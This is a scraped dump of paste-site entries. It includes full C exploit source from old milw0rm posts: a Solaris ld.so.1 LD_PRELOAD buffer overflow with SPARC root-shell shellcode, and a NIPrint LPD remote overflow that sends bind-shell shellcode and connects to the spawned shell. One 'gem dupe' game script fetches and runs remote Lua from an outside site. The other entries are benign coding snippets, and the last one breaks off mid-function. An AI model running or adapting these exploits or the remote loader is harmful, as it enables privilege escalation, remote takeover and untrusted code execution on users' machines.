            return 0;
    }
    close(sock);

    sleep(1);
    
    sin.sin_port = htons(7175);

    if ((sock=socket(AF_INET,SOCK_STREAM,0)) == -1)
    {
        perror(""socket"");
        return(0);
    }
    
    if(connect(sock,(struct sockaddr *)&sin, sizeof(struct sockaddr)) == -1)
    {
        printf(""Exploit failed\n"");
        return(0);
    }   
    
    printf(""Entering shell\n"");
    entershell(sock);
    return 1;

}


// milw0rm.com [2003-11-07]"
gr6WbMSS,Solaris Runtime Linker (SPARC) - 'ld.so.1' Local Buffer Overflow - CVE-2003-0609,FlyFar,C,Saturday 17th of February 2024 09:49:43 PM CDT,"/* #############################
 * ## ld.so.1 exploit (SPARC) ##
 * #############################
 * [coded by: osker178 (bjr213 psu.edu)]
 *
 * Alright, so this exploits a fairly standard buffer
 * overflow in the default Solaris runtime linker (ld.so.1)
 * (discovery by Jouko Pynnonen)
 * Only real deviation here from the standard overflow
 * and return into libc scenario is that at the time that 
 * overflow occurs, the libc object file has not been loaded; 
 * so it's not really possible to return into a libc function.
 * However, this poses no real problem to us, as ld.so.1 
 * provides it's own ___cpy() functions which we can use to 
 * move our shellcode into an appropriate place in memory.  
 *
 * Some things to note:
 *
 *  -  obviously some of the pre-defined addresses will have to be changed
 *  
 *  -  1124-1128 bytes into our buffer provided to LD_PRELOAD we will end up
 *     overwriting a char *; this is actually very helpful for locating where
 *     the rest of our information is stored in memory, as this pointer
 *     will be used to display another error message, showing us what string 
 *     is stored at the address we overwrote this pointer with.
 *  
 *  -  ... eh, that's enough, just look at the code to figure the rest out
 */
#include <dlfcn.h>
#include <stdio.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <link.h>


char SPARC_sc[] =
  /* setuid(0) */
  ""\x90\x1b\xc0\x0f"" /* xor     %o7,%o7,%o0 */
  ""\x82\x10\x20\x17"" /* mov     23,%g1 | 23 == SYS_setuid()*/
  ""\x91\xd0\x20\x08"" /* ta      8 */

  /* setreuid(0,0) - for me at least, these both had to be called */
  ""\x92\x1a\x40\x09"" /* xor     %o1,%o1,%o1 */
  ""\x82\x10\x20\xca"" /* mov     202, %g1 | 202 == SYS_setreuid()*/
  ""\x91\xd0\x20\x08"" /* ta      8 */

  /* exec(/bin/sh) */
  ""\x21\x0b\xd8\x9a"" /* sethi   %hi(0x2f626800), %l0 */
  ""\xa0\x14\x21\x6e"" /* or      %l0, 0x16e, %l0 ! 0x2f62696e */
  ""\x23\x0b\xdc\xda"" /* sethi   %hi(0x2f736800), %l1 */
  ""\x90\x23\xa0\x10"" /* sub     %sp, 16, %o0 */
  ""\x92\x23\xa0\x08"" /* sub     %sp, 8, %o1 */
  ""\x94\x1b\x80\x0e"" /* xor     %sp, %sp, %o2 */
  ""\xe0\x3b\xbf\xf0"" /* std     %l0, [%sp - 16] */
  ""\xd0\x23\xbf\xf8"" /* st      %o0, [%sp - 8] */
  ""\xc0\x23\xbf\xfc"" /* st      %g0, [%sp - 4] */
  ""\x82\x10\x20\x3b"" /* mov     59, %g1 | 59 = SYS_execve() */
  ""\x91\xd0\x20\x08"" /* ta      8 */
;


const long FRAME_ADDR = 0xffbee938;
const long SHELLCODE_ADDR = 0xffbef17a;   
const long DESTCPY_ADDR = 0xff3e7118; 
const long DEF_OFFSET = 0x20;

const int ENV_STR_SIZE = 2048;
const int FRAME_SIZE = 64; /* 8 %i regs and 8 %l regs */
const int DEF_FPAD_LEN = 4;
const int REC_BUF_SIZE = 1456;


char * get_ld_env(int buf_len, long offset); 
char * get_fake_frame(long offset);
char * get_envs_str(char fill);
unsigned long get_strcpy_addr();



/* ********************************************** *
 * ******************** MAIN ******************** *
 * ********************************************** */

int main(int argc, char **argv)
{

  char *prog[3];
  char *envs[7];  
  char opt;
  int buf_size = -1;
  int fpad_len = -1;
  long offset = -1;

  char *ld_pre_env = 0x0;
  char *fake_frame = 0x0;
 

  /* padding of sorts */
  char *envs_str1 = 0x0; 
  char *envs_str2 = 0x0; 
  char *fpad_buf = 0x0;

  // ------------------------------------------------ //
  

  while((opt = getopt(argc, argv, ""s:o:p:"")) != -1)
  {
    switch(opt) {
    case 's':
      if(!optarg) {
	printf(""-s needs size argument\n"");
	exit(0);
      }
      else
	buf_size = atoi(optarg);
      break;

    case 'o':
      if(!optarg) {
	printf(""-o needs offset argument\n"");
	exit(0);
      }
      else
	offset = atol(optarg);
      break;

    case 'p':
      if(!optarg) {
	printf(""-p needs pad length argument\n"");
	exit(0);
      }
      else {
	fpad_len = atoi(optarg);
	if(fpad_len < 0)
	  fpad_len = 0;
      }
      break;

    default:
      printf(""Usage: %s [-s size] [-o offset] [-p fpad_len]\n"", argv[0]);
      exit(0);

    }
    
    argc -= optind;
    argv += optind;	
  }
  
  printf(""\n#######################################\n"");
  printf(""# ld.so.1 LD_PRELOAD (SPARC) exploit  #\n"");
  printf(""# coded by: osker178 (bjr213@psu.edu) #\n"");
    printf(""#######################################\n\n"");

  if(buf_size == -1)
  {
    printf(""Using default/recommended buffer size of %d\n"", REC_BUF_SIZE);
    buf_size = REC_BUF_SIZE;
  }
  else if(buf_size % 4)
  {
    buf_size = buf_size + (4 - (buf_size%4));
    printf(""WARNING: Rounding BUF_SIZE up to 0x%x (%d)\n"", buf_size, buf_size);
  }


  if(offset == -1)
  {
    printf(""Using default OFFSET of 0x%x (%d)\n"", DEF_OFFSET, DEF_OFFSET);
    offset = DEF_OFFSET;
  }  
  else if((FRAME_ADDR + offset) % 8)
  {
    offset = offset + (8 - (offset%8));
    printf(""WARNING: Rounding offset up to 0x%x (%d)\n"", offset, offset);
    printf(""(otherwise FRAME_ADDR would not be alligned correctly)\n"");
  }


  if(fpad_len == -1)
  {
    printf(""Using default FPAD_LEN of 0x%x (%d)\n"", DEF_FPAD_LEN, DEF_FPAD_LEN);
    fpad_len = DEF_FPAD_LEN;
  }

  // -------------------------------------------------- //


  ld_pre_env = get_ld_env(buf_size, offset);
  if(!ld_pre_env)
    exit(0);
  
  fake_frame = get_fake_frame(offset);
  if(!fake_frame)
    exit(0);
  
  envs_str1 = get_envs_str('1');
  if(!envs_str1)
    exit(0);

  envs_str2 = get_envs_str('2');
  if(!envs_str2)
    exit(0);

    

  // -------------------------------------------------- //


  fpad_buf = (char *)malloc(fpad_len+1);
  if(!fpad_buf)
  {
    perror(""malloc"");
    exit(0);
  }
  memset(fpad_buf, 'F', fpad_len);
  fpad_buf[fpad_len] = '\0';
  

  envs[0] = fpad_buf;
  envs[1] = fake_frame;
  envs[2] = envs_str1;
  envs[3] = SPARC_sc;
  envs[4] = envs_str2;
  envs[5] = ld_pre_env;
  envs[6] = NULL;

  prog[0] = ""/usr/bin/passwd"";
  prog[1] = ""passwd"";
  prog[2] = NULL;

  execve(prog[0], prog, envs);

  perror(""execve"");

  return 0;
}


/* ********************************************** */





/* ********************************************** *
 * ***************** GET_LD_ENV ***************** *
 * ********************************************** */
char * get_ld_env(int buf_len, long offset)
{
  long *lp;
  char *buf;
  char *ld_pre_env;
  unsigned long strcpy_ret;

  strcpy_ret = get_strcpy_addr(); 
  if(!strcpy_ret)
    return 0;
  else
    printf(""strcpy found at [0x%x]\n\n"", strcpy_ret);

  /*
   * buf_size --> main requested length (rounded up to nearest factor of 4)
   * +FRAME_SIZE --> for the fake frame values (64 bytes worth) we will overwrite
   * +1 --> for the ""/"" character that must be appended in order to pass the strchr() 
   *        and strrchr() tests (see <load_one>: from objdump -d /usr/lib/ld.so.1)
   * +1 --> '\0' obviously
   */
  buf = (char *)malloc(buf_len + FRAME_SIZE + 1 + 1); 
  if(!buf)
  {
    perror(""malloc"");
    return 0;
  }


  memset(buf, 'A', buf_len); 
  buf[0] = '/';
  
  /* this is the location of the (char *) in ld.so.1 we are overwriting 
   * -> use this to find the address of the environment
   *    arguments (whatever value we write at this address
   *    is what will be displayed in an error message
   *    from ld.so.1 after the error message generated from
   *    our insecure path provided in LD_PRELOAD)
   */
  lp = (long *)(buf + 1124);
  *lp++ = FRAME_ADDR + offset; 

  lp = (long *)(buf + buf_len);

  /* %l regs - as far as we're concerned, these
   *           values don't matter (i've never
   *           had a problem with them)
   */
  *lp++ = 0x61616161; /* %l0 */
  *lp++ = 0x62626262; /* %l1 */
  *lp++ = 0x63636363; /* %l2 */
  *lp++ = 0x64646464; /* %l3 */
  *lp++ = 0x65656565; /* %l4 */
  *lp++ = 0x66666666; /* %l5 */
  *lp++ = 0x67676767; /* %l6 */
  *lp++ = 0x68686868; /* %l7 */

  /* %i regs */
  *lp++ = 0x69696969;     /* %i0 */
  *lp++ = 0x70707070;     /* %i1 */
  *lp++ = 0x71717171;     /* %i2 */
  *lp++ = 0x72727272;     /* %i3 */
  *lp++ = 0x73737373;     /* %i4 */
  *lp++ = 0x74747474;     /* %i5 */
  *lp++ = FRAME_ADDR + offset; /* our fake frame/%i6 */
  *lp = strcpy_ret;      /* ret address/%i7 */
  strcat(buf, ""/"");


  /* put together our LD_PRELOAD buffer */
  ld_pre_env = (char *)malloc(strlen(buf) + strlen(""LD_PRELOAD="") + 1);
  if(!ld_pre_env)
  {
    perror(""malloc"");
    return 0;
  }

  strcpy(ld_pre_env, ""LD_PRELOAD="");
  strcat(ld_pre_env + strlen(ld_pre_env), buf);
  
  free(buf);
  
  return ld_pre_env;
}




/* ********************************************** *
 * *************** GET_FAKE_FRAME *************** *
 * ********************************************** */
char * get_fake_frame(long offset)
{
  long destcpy_addr;
  long *lp;
  char *frame = (char *)malloc(FRAME_SIZE + 1);

  if(!frame)
  {
    perror(""malloc"");
    return 0;
  }

  /* this worked for me; may have to adjust though 
   * - can easily find a good place by using gdb and pmap */
  destcpy_addr = get_strcpy_addr() + 0x17000;

  lp = (long *)frame;
  
  /* %l regs - values don't matter */
  *lp++ = 0x42454746; /* %l0 <- == ""BEGF"", use this to help locate frame's address */
  *lp++ = 0xdeaddead; /* %l1 */
  *lp++ = 0xdeaddead; /* %l2 */
  *lp++ = 0xdeaddead; /* %l3 */
  *lp++ = 0xdeaddead; /* %l4 */
  *lp++ = 0xdeaddead; /* %l5 */
  *lp++ = 0xdeaddead; /* %l6 */
  *lp++ = 0xdeaddead; /* %l7 */

  /* %i regs */
  *lp++ = destcpy_addr;              /* %i0 - DESTINATION ADDRESS for ___cpy() */
  *lp++ = (SHELLCODE_ADDR + offset); /* %i1 - SOURCE ADDRESS for ___cpy() */
  *lp++ = 0xdeaddead;                /* %i2 - size*/
  *lp++ = 0xdeaddead;                /* %i3 */
  *lp++ = 0xdeaddead;                /* %i4 */
  *lp++ = 0xdeaddead;                /* %i5 */
  *lp++ = destcpy_addr+0x200;        /* saved frame pointer/%i6(sp) */
  *lp++ = destcpy_addr-0x8;          /* %i7 */
  *lp++ = 0x0;

  return frame;
}



/* ********************************************** *
 * **************** GET_ENVS_STR **************** *
 * ********************************************** */
char * get_envs_str(char fill)
{
  char *envs_str = (char *)malloc(ENV_STR_SIZE + 1);
  
  if(!envs_str)
  {
    perror(""malloc"");
    return 0;
  }


  memset(envs_str, fill, ENV_STR_SIZE);
  envs_str[0] = 'b'; // \ 
  envs_str[1] = 'e'; // --- help find where we are in memory/in relation to other env variables  */
  envs_str[2] = 'g'; // /  
  envs_str[ENV_STR_SIZE] = '\0';
  
  return envs_str;
}



/* ********************************************** *
 * *************** GET_STRCPY_ADDR ************** *
 * ********************************************** */
unsigned long get_strcpy_addr()
{
  void *handle;
  Link_map *lm;
  unsigned long addr;

  if((handle = dlmopen(LM_ID_LDSO, NULL, RTLD_LAZY)) == NULL)
  {
    perror(""dlmopen"");
    return 0;
  }


  if((dlinfo(handle, RTLD_DI_LINKMAP, &lm)) == -1)
  {
    perror(""dlinfo"");
    return 0;
  }


  if((addr = (unsigned long)dlsym(handle, ""strcpy"")) == NULL)
  {
    perror(""dlsym"");
    return 0;
  } 
  
  /* -4 to skip save and use 
   * our fake frame instead */
  addr -= 4;
 
  /* make sure addr doesn't contain any 0x00 bytes,
   * or '/' characters (as this is where strcpy will
   * cutoff in ld.so.1) */
  if( !(addr & 0xFF) || !(addr & 0xFF00) || 
      !(addr & 0xFF0000) || !(addr & 0xFF000000) ||
      ((addr & 0xFF) == 0x2f) ||
      ((addr & 0xFF00) == 0x2f) ||
      ((addr & 0xFF0000) == 0x2f) ||
      ((addr & 0xFF000000) == 0x2f) )
  {
    printf(""ERROR: strcpy address (0x%x) contains unusable bytes somewhere.\n"", addr);
    printf(""       -> consider using strncpy, memcpy, or another similar substitute instead.\n"");
    return 0;
  }

  return addr;
}


// milw0rm.com [2003-10-27]
            "
Bi06B0xX,NIPrint LPD-LPR Print Server 4.10 - Remote Overflow - CVE-2003-1142,FlyFar,C,Saturday 17th of February 2024 09:38:25 PM CDT,"/*
\	remote exploit for NIPrint LPD-LPR Print Server (Version <= 4.10)
/
\	by xCrZx /BLack Sand Project/ /04.11.03/
/
\	bug found by KF
/	successfully tested on Win XP 5.1.2600
/	P.S.#1 coded just for fun...
\	P.S.#2 this exploit can be compiled under Win32 and *nix
*/


#ifdef _WIN32

 #include <winsock.h>
 #include <windows.h>

#else

 #include <netinet/in.h>  
 #include <netdb.h>
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
 #include <fcntl.h>
 #include <unistd.h>
 #include <errno.h>

#endif

#include <stdio.h>

// JMP ESP ADDRESS (in Win XP 5.1.2600)
#define RET 0x77F5801c
#define SHELL 7788

char shellcode[] =

        ""\x90\xeb\x03\x5d\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc5\x15\x90\x90""
        ""\x90\x8b\xc5\x33\xc9\x66\xb9\x10\x03\x50\x80\x30\x97\x40\xe2\xfa""
        ""\x7e\x8e\x95\x97\x97\xcd\x1c\x4d\x14\x7c\x90\xfd\x68\xc4\xf3\x36""
        ""\x97\x97\x97\x97\xc7\xf3\x1e\xb2\x97\x97\x97\x97\xa4\x4c\x2c\x97""
        ""\x97\x77\xe0\x7f\x4b\x96\x97\x97\x16\x6c\x97\x97\x68\x28\x98\x14""
        ""\x59\x96\x97\x97\x16\x54\x97\x97\x96\x97\xf1\x16\xac\xda\xcd\xe2""
        ""\x70\xa4\x57\x1c\xd4\xab\x94\x54\xf1\x16\xaf\xc7\xd2\xe2\x4e\x14""
        ""\x57\xef\x1c\xa7\x94\x64\x1c\xd9\x9b\x94\x5c\x16\xae\xdc\xd2\xc5""
        ""\xd9\xe2\x52\x16\xee\x93\xd2\xdb\xa4\xa5\xe2\x2b\xa4\x68\x1c\xd1""
        ""\xb7\x94\x54\x1c\x5c\x94\x9f\x16\xae\xd0\xf2\xe3\xc7\xe2\x9e\x16""
        ""\xee\x93\xe5\xf8\xf4\xd6\xe3\x91\xd0\x14\x57\x93\x7c\x72\x94\x68""
        ""\x94\x6c\x1c\xc1\xb3\x94\x6d\xa4\x45\xf1\x1c\x80\x1c\x6d\x1c\xd1""
        ""\x87\xdf\x94\x6f\xa4\x5e\x1c\x58\x94\x5e\x94\x5e\x94\xd9\x8b\x94""
        ""\x5c\x1c\xae\x94\x6c\x7e\xfe\x96\x97\x97\xc9\x10\x60\x1c\x40\xa4""
        ""\x57\x60\x47\x1c\x5f\x65\x38\x1e\xa5\x1a\xd5\x9f\xc5\xc7\xc4\x68""
        ""\x85\xcd\x1e\xd5\x93\x1a\xe5\x82\xc5\xc1\x68\xc5\x93\xcd\xa4\x57""
        ""\x3b\x13\x57\xe2\x6e\xa4\x5e\x1d\x99\x13\x5e\xe3\x9e\xc5\xc1\xc4""
        ""\x68\x85\xcd\x3c\x75\x7f\xd1\xc5\xc1\x68\xc5\x93\xcd\x1c\x4f\xa4""
        ""\x57\x3b\x13\x57\xe2\x6e\xa4\x5e\x1d\x99\x17\x6e\x95\xe3\x9e\xc5""
        ""\xc1\xc4\x68\x85\xcd\x3c\x75\x70\xa4\x57\xc7\xd7\xc7\xd7\xc7\x68""
        ""\xc0\x7f\x04\xfd\x87\xc1\xc4\x68\xc0\x7b\xfd\x95\xc4\x68\xc0\x67""
        ""\xa4\x57\xc0\xc7\x27\x9b\x3c\xcf\x3c\xd7\x3c\xc8\xdf\xc7\xc0\xc1""
        ""\x3a\xc1\x68\xc0\x57\xdf\xc7\xc0\x3a\xc1\x3a\xc1\x68\xc0\x57\xdf""
        ""\x27\xd3\x1e\x90\xc0\x68\xc0\x53\xa4\x57\x1c\xd1\x63\x1e\xd0\xab""
        ""\x1e\xd0\xd7\x1c\x91\x1e\xd0\xaf\xa4\x57\xf1\x2f\x96\x96\x1e\xd0""
        ""\xbb\xc0\xc0\xa4\x57\xc7\xc7\xc7\xd7\xc7\xdf\xc7\xc7\x3a\xc1\xa4""
        ""\x57\xc7\x68\xc0\x5f\x68\xe1\x67\x68\xc0\x5b\x68\xe1\x6b\x68\xc0""
        ""\x5b\xdf\xc7\xc7\xc4\x68\xc0\x63\x1c\x4f\xa4\x57\x23\x93\xc7\x56""
        ""\x7f\x93\xc7\x68\xc0\x43\x1c\x67\xa4\x57\x1c\x5f\x22\x93\xc7\xc7""
        ""\xc0\xc6\xc1\x68\xe0\x3f\x68\xc0\x47\x14\xa8\x96\xeb\xb5\xa4\x57""
        ""\xc7\xc0\x68\xa0\xc1\x68\xe0\x3f\x68\xc0\x4b\x9c\x57\xe3\xb8\xa4""
        ""\x57\xc7\x68\xa0\xc1\xc4\x68\xc0\x6f\xfd\xc7\x68\xc0\x77\x7c\x5f""
        ""\xa4\x57\xc7\x23\x93\xc7\xc1\xc4\x68\xc0\x6b\xc0\xa4\x5e\xc6\xc7""
        ""\xc1\x68\xe0\x3b\x68\xc0\x4f\xfd\xc7\x68\xc0\x77\x7c\x3d\xc7\x68""
        ""\xc0\x73\x7c\x69\xcf\xc7\x1e\xd5\x65\x54\x1c\xd3\xb3\x9b\x92\x2f""
        ""\x97\x97\x97\x50\x97\xef\xc1\xa3\x85\xa4\x57\x54\x7c\x7b\x7f\x75""
        ""\x6a\x68\x68\x7f\x05\x69\x68\x68\xdc\xc1\x70\xe0\xb4\x17\x70\xe0""
        ""\xdb\xf8\xf6\xf3\xdb\xfe\xf5\xe5\xf6\xe5\xee\xd6\x97\xdc\xd2\xc5""
        ""\xd9\xd2\xdb\xa4\xa5\x97\xd4\xe5\xf2\xf6\xe3\xf2\xc7\xfe\xe7\xf2""
        ""\x97\xd0\xf2\xe3\xc4\xe3\xf6\xe5\xe3\xe2\xe7\xde\xf9\xf1\xf8\xd6""
        ""\x97\xd4\xe5\xf2\xf6\xe3\xf2\xc7\xe5\xf8\xf4\xf2\xe4\xe4\xd6\x97""
        ""\xd4\xfb\xf8\xe4\xf2\xdf\xf6\xf9\xf3\xfb\xf2\x97\xc7\xf2\xf2\xfc""
        ""\xd9\xf6\xfa\xf2\xf3\xc7\xfe\xe7\xf2\x97\xd0\xfb\xf8\xf5\xf6\xfb""
        ""\xd6\xfb\xfb\xf8\xf4\x97\xc0\xe5\xfe\xe3\xf2\xd1\xfe\xfb\xf2\x97""
        ""\xc5\xf2\xf6\xf3\xd1\xfe\xfb\xf2\x97\xc4\xfb\xf2\xf2\xe7\x97\xd2""
        ""\xef\xfe\xe3\xc7\xe5\xf8\xf4\xf2\xe4\xe4\x97\x97\xc0\xc4\xd8\xd4""
        ""\xdc\xa4\xa5\x97\xe4\xf8\xf4\xfc\xf2\xe3\x97\xf5\xfe\xf9\xf3\x97""
        ""\xfb\xfe\xe4\xe3\xf2\xf9\x97\xf6\xf4\xf4\xf2\xe7\xe3\x97\xe4\xf2""
        ""\xf9\xf3\x97\xe5\xf2\xf4\xe1\x97\x95\x97\x89\xfb\x97\x97\x97\x97""
        ""\x97\x97\x97\x97\x97\x97\x97\x97\xf4\xfa\xf3\xb9\xf2\xef\xf2\x97""
        ""\x68\x68\x68\x68"";


long getip(char *hostname) {
	struct hostent *he;
	long ipaddr;
	
	if ((ipaddr = inet_addr(hostname)) < 0) {
		if ((he = gethostbyname(hostname)) == NULL) {
			perror(""gethostbyname()"");
			exit(-1);
		}
		memcpy(&ipaddr, he->h_addr, he->h_length);
	}	
	return ipaddr;
}

int main(int argc, char **argv) {

#ifdef _WIN32
	WSADATA wsaData;
#endif

	int sock;
	struct sockaddr_in sockstruct;
	char tmp[2000];


	if(!argv[1]) { printf(""Usage: %s <address>\n"",argv[0]);exit(0); }

#ifdef _WIN32

	if(WSAStartup(0x101,&wsaData)){
        printf(""Unable to initialize WinSock lib.\n"");
        exit(0);
	}

#endif

	memset(sockstruct.sin_zero,0x00,sizeof(sockstruct.sin_zero));
	sock=socket(PF_INET,SOCK_STREAM,0);
	sockstruct.sin_family=PF_INET; 
    	sockstruct.sin_addr.s_addr=getip(argv[1]);
    	sockstruct.sin_port=htons(515);

	if(connect(sock,(struct sockaddr*)&sockstruct,sizeof(sockstruct))>-1) {

	    printf(""[+] Connected to %s:515!\n"",argv[1]);

		memset(tmp,0x00,sizeof tmp);
		memset(tmp,0x41,49);
		*(long *)&tmp[strlen(tmp)]=RET;
		memset(tmp+strlen(tmp),0x90,50);
		memcpy(tmp+strlen(tmp),&shellcode,strlen(shellcode));
		send(sock,tmp,strlen(tmp),0);
		printf(""[+] Exploit code was sent!\n"");
    }

#ifdef _WIN32
	closesocket(sock);
	WSACleanup();
#else
	close(sock);
#endif

	printf(""[+] Connecting to %s:%d\n"",argv[1],SHELL);
	sprintf(tmp,""telnet %s %d\n"",argv[1],SHELL);
	system(tmp);
	printf(""[-] Not connected! NIPrint probably not vulnerable!\n"");

	return 0;
}

// milw0rm.com [2003-11-04]
            "
bPWKefBz,339. Nested List Weight Sum,bennyfromtheblock,Python,Saturday 17th of February 2024 08:53:28 PM CDT,"# Method 1: DFS

class Solution:
    def depthSum(self, nestedList: List[NestedInteger]) -> int:
        total = 0

        def dfs(item, depth):
            if item.isInteger():
                return depth * item.getInteger()

            total = 0
            for nested in item.getList():
                total += dfs(nested, depth + 1)

            return total

        for nested in nestedList:
            total += dfs(nested, 1)

        return total
    
# Method 2: BFS
from collections import deque


class Solution:
    def depthSum(self, nestedList: List[NestedInteger]) -> int:
        queue = deque([(1, item) for item in nestedList])
        total = 0

        while queue:
            depth, item = queue.popleft()
            if item.isInteger():
                total += depth * item.getInteger()
                continue
            for n in item.getList():
                queue.append((depth + 1, n))

        return total
    
    
# Both solutions O(N) time complexity
# Space complexity: BFS O(W), where W is max width, the max number of items at the same depth level (worst case N)
# DFS O(H), where H is max depth
"
NZayHqni,Clojure operators -> and ->> wrote in Scheme,flalli,Scheme,Saturday 17th of February 2024 08:50:22 PM CDT,"  ;;
  ;; See https://clojuredocs.org/clojure.core/-%3E
  ;; for more info.
  ;;
  ;; (string-append (string-titlecase ""abracada bra"") ""a"" ""x"")
  ;; (-> ""abracada bra"" string-titlecase (string-append ""a"" ""x""))
  ;;
  ;; (string-reverse (string-titlecase ""xpto""))
  ;; (-> ""xpto"" string-titlecase string-reverse)
  ;;
  ;; (string-titlecase (string-reverse (string-titlecase ""xpto"")))
  ;; (-> ""xpto"" string-titlecase string-reverse string-titlecase)
  ;;
  (define-syntax ->
    (syntax-rules ()
      ((_ a) a)
      ((_ a (b c ...)) (b a c ...))
      ((_ a b) (b a))
      ((_ a b c) (-> (-> a b) c))
      ((_ a b ... c) (-> (-> a b ...) c))))

  ;;
  ;; See https://clojuredocs.org/clojure.core/-%3E%3E
  ;; for more info.
  ;;
  ;; (reduce + 0 (take '(1 2 3 4 5) 2))
  ;; (->> 2 (take '(1 2 3 4 5)) (reduce + 0))
  ;;
  ;; (reduce / 1 (take '(4 3 2 1) 3))
  ;; (->> 3 (take '(4 3 2 1)) (reduce / 1))
  ;;
  (define-syntax ->>
    (syntax-rules ()
      ((_ a) a)
      ((_ a (b c ...)) (b c ... a))
      ((_ a b) (b a))
      ((_ a b c) (->> (->> a b) c))
      ((_ a b ... c) (->> (->> a b ...) c))))"
6kdiAEs3,Untitled,smj007,Python,Saturday 17th of February 2024 08:48:46 PM CDT,"class Solution:
    def lengthOfLIS(self, nums: List[int]) -> int:

        lis = [0]*len(nums)
        max_so_far = 0

        for i in range(len(nums)):
            max_prev = 0
            for j in range(i):
                if nums[i] > nums[j]:
                    max_prev = max(max_prev, lis[j])
                
            lis[i] = 1 + max_prev
            max_so_far = max(max_so_far, lis[i])

        return max_so_far

class Solution:
    def lengthOfLIS(self, nums: List[int]) -> int:

        lis = [1]*len(nums)
        max_so_far = 0

        for i in range(len(nums)):
            for j in range(i):
                if nums[i] > nums[j]:
                    lis[i] = max(lis[i], 1 + lis[j])
                
            max_so_far = max(max_so_far, lis[i])

        return max_so_far"
ybmECv6h,Premium Gem Dupe PS 99 Script,petsimscripts,C++,Saturday 17th of February 2024 08:44:27 PM CDT,loadstring(game:HttpGet('https://hugegames.space/c1915fe738f756f4d965e37e.lua'))()
Z2myzNuF,harvestPureDaisyItem.lua,Whoopty_Doo,Lua,Saturday 17th of February 2024 08:36:04 PM CDT,"local fuelSlot = 1
local placerSlot = 15
local placerType = 16

local function GoDig(i)
  for moves = 1,i do
	  turtle.dig()
	  turtle.forward()
  end
end

local function BackAndPlace(i)
  for moves = 1,i do
    turtle.back()
    turtle.place()
  end
end

local function CheckFuel()
    if turtle.getFuelLevel() < 30 then
		turtle.select(fuelSlot)
		return turtle.refuel(1,1)
    end
	return true
end

local function CheckInventory()
	turtle.select(placerType)
	while turtle.getItemCount(placerSlot) < 16 do
		for slot = 3,15 do
			--# if current slot is correct material
			if turtle.getItemCount(slot) > 0 and turtle.compareTo(slot) == true then
				turtle.select(slot)
				turtle.transferTo(placerSlot)
				turtle.select(placerSlot)
				return true
			end
		end
		print(""Out of materials, add more of the same type as slot ""..placerType)
		local event, p1 = os.pullEvent(""turtle_inventory"")
	end
	if turtle.getItemCount(placerType) == 0 then
		error(""Please put example type of block to be placed in slot ""..placerSlot)
	end
end

while true do
  CheckInventory()
  if CheckFuel() == false then
    print(""Need more fuel in slot ""..fuelSlot)
	local event p2 = os.pullEvent(""turtle_inventory"")
  end
  os.pullEvent(""redstone"")
  if rs.getInput(""top"") == true then
    print(""input detected"")
    GoDig(6)
    turtle.turnLeft()
    GoDig(2)
    turtle.turnLeft()
    GoDig(2)
    turtle.turnLeft()
    turtle.dig()
    turtle.turnRight()
    GoDig(1)
    turtle.turnLeft()
    turtle.dig()
    turtle.turnRight()
    GoDig(2)
    turtle.turnLeft()
    turtle.dig()
    turtle.select(placerSlot)
    turtle.place()
    turtle.turnRight()
    BackAndPlace(2)
    turtle.turnLeft()
    turtle.place()
    turtle.turnRight()
    BackAndPlace(1)
    turtle.turnLeft()
    turtle.place()
    turtle.turnRight()
    BackAndPlace(2)
    turtle.turnRight()
    BackAndPlace(2)
    turtle.turnRight()
    BackAndPlace(6)
	CheckFuel()
  end
end
"
WcNnhWGr,,xiaomianao666,JavaScript,Saturday 17th of February 2024 08:33:49 PM CDT,page_detail@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi6ZqP5py65bCP5aeQ5aeQXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiI2ltbWVyc2l2ZVRoZW1lI2hpa2VyOi8vZW1wdHlcIixcImZpbmRfcnVsZVwiOlwianM6bGV0IGQ9W107ZC5wdXNoKHtkZXNjOicxMDAlJiZmbG9hdCcsdXJsOidodHRwczovL3QueHhnZWVrLmNvbS90b29scy9tbXZvZC9tLnBocCcsY29sX3R5cGU6J3g1X3dlYnZpZXdfc2luZ2xlJyxleHRyYTp7Y2FuQmFjazp0cnVlfX0pO3NldFJlc3VsdChkKTtcIixcImdyb3VwXCI6XCJcIn0iLCJ0aXRsZSI6Iumaj+acuuWwj+WnkOWnkCJ9
ZeLS4SzL,Untitled,hpnq,C++,Saturday 17th of February 2024 08:32:01 PM CDT,"#include ""bits/stdc++.h""
//speed coding

#define mp make_pair
#define cve(tpy) for (auto i : tpy) {for(auto j : i){cout << j << "" "";  }cout << ""\n"";} ;
#define f first
#define s second
#define loop(i, x, n) for (int i = x; i < n; i++)
#define joop(x, n) for (ll j = x; j < n; j++)
#define lp(n) for (ll i = 0; i < n; i++)
#define err cout << ""ERROR"" << endl;
#define all(x) x.begin(), x.end()
#define pb push_back
#define sz(x) x.size()
#define rndm rng()

// types
#define pii pair<int, int>
#define pll pair<ll, ll>
#define vvi vector<vector<int>>
#define vvll vector<vector<ll>>
typedef long long ll;
typedef long double ld;

// types of data
#define inf 1000000000
#define infll 1000000000000000000
#define INF ll(1e18)

#define md 998244353
#define mod 1000000009
//#define K 239017

#define DEBUG 1
using namespace std;
mt19937_64 rng(113113);
uniform_int_distribution<ll> drist;


vector<vector<int>> g, inc;
int n, m;

void hip_1(int x){
    for(auto i : g[x-1]){
        cout << i + 1 << ""\n""; //    x
    }
}
void ve_2(int u){
    loop(i, 0, n){
        for(auto v : g[i]){
            if(u+1 == v){
                cout << i+1 << '\n';
                continue;
            }
        }
    }
}

void dv_hip_3(){
    vector<vector<int>> g1;
    g1.resize(m);
    loop(i, 0, n){
        loop(j, 0, m){
            if(inc[i][j]){
                g1[j].pb(i);
            }
        }
    }
}

void l4(){
    // 
    vector<vector<int>> g_1;
